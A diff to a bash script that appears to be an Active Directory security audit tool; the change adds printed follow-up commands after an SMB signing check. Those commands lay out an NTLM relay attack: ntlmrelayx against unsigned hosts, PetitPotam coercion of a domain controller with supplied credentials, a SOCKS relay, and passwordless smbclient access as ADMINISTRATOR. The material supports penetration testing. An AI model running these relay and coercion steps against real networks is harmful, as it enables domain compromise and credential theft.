@@ -345,7 +345,6 @@ if [ -f "$OUTPUT_DIR/relay_targets_raw.txt" ]; then
 fi
 
 RELAY_COUNT=$(wc -l < "$OUTPUT_DIR/relay_targets.txt" 2>/dev/null || echo 0)
-
 if [ "$RELAY_COUNT" -gt 0 ]; then
   echo -e "${RED}[KO] $RELAY_COUNT non-DC host(s) without SMB Signing → relay_targets.txt${NC}"
 else
@@ -378,11 +377,23 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
       printf "$VULN_SMB_DCS"
     fi
     
+    # Extract first vulnerable DC IP (once)
+    FIRST_DC_IP=$(echo "$VULN_SMB_DCS" | head -1 | grep -oP '\d+\.\d+\.\d+\.\d+')
+    
+    # Primary exploit: Non-DC relay targets
     if [ "$RELAY_COUNT" -gt 0 ]; then
-      echo -e "${RED}       └─ Coerce computers from relay_targets.txt to vulnerable DC(s)${NC}"
+      echo -e "${RED}       └─ Exploitable: Coerce DC to non-DC relay targets${NC}"
+      echo -e "${GREY}          1) ntlmrelayx.py -tf '$OUTPUT_DIR/relay_targets.txt' -smb2support${NC}"
+      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${FIRST_DC_IP}${NC}"
     else
-      echo -e "${GREEN}       └─ Not exploitable: No relay targets without signing in relay_targets.txt found${NC}"
+      echo -e "${GREEN}       └─ Not exploitable via relay: No targets without SMB Signing found${NC}"
     fi
+    
+    # Additional info: SOCKS access
+    echo -e "${GREY}       └─ Additionally: SOCKS Relay for share enumeration${NC}"
+    echo -e "${GREY}          1) ntlmrelayx.py -t smb://${FIRST_DC_IP} -smb2support -socks${NC}"
+    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${FIRST_DC_IP}${NC}"
+    echo -e "${GREY}          3) proxychains4 impacket-smbclient -no-pass '${DOMAIN}/ADMINISTRATOR\$@${FIRST_DC_IP}'${NC}"
   else
     echo -e "${GREEN}[OK] All DCs have SMB Signing required${NC}"
   fi
@@ -393,11 +404,21 @@ else
     echo -e "${GREEN}[OK] SMB Signing required on DC${NC}"
   else
     echo -e "${RED}[KO] SMB Signing NOT required on DC${NC}"
+    
+    # Primary exploit: Non-DC relay targets
     if [ "$RELAY_COUNT" -gt 0 ]; then
-      echo -e "${RED}       └─ Coerce computers from relay_targets.txt to DC${NC}"
+      echo -e "${RED}       └─ Exploitable: Coerce DC to non-DC relay targets${NC}"
+      echo -e "${GREY}          1) ntlmrelayx.py -tf '$OUTPUT_DIR/relay_targets.txt' -smb2support${NC}"
+      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
     else
-      echo -e "${GREEN}       └─ Not exploitable: No relay targets without signing in relay_targets.txt found${NC}"
+      echo -e "${GREEN}       └─ Not exploitable via relay: No targets without SMB Signing found${NC}"
     fi
+    
+    # Additional info: SOCKS access
+    echo -e "${GREY}       └─ Additionally: SOCKS Relay for share enumeration${NC}"
+    echo -e "${GREY}          1) ntlmrelayx.py -t smb://${DC_IP} -smb2support -socks${NC}"
+    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
+    echo -e "${GREY}          3) proxychains4 impacket-smbclient -no-pass '${DOMAIN}/ADMINISTRATOR\$@${DC_IP}'${NC}"
   fi
 fi
 
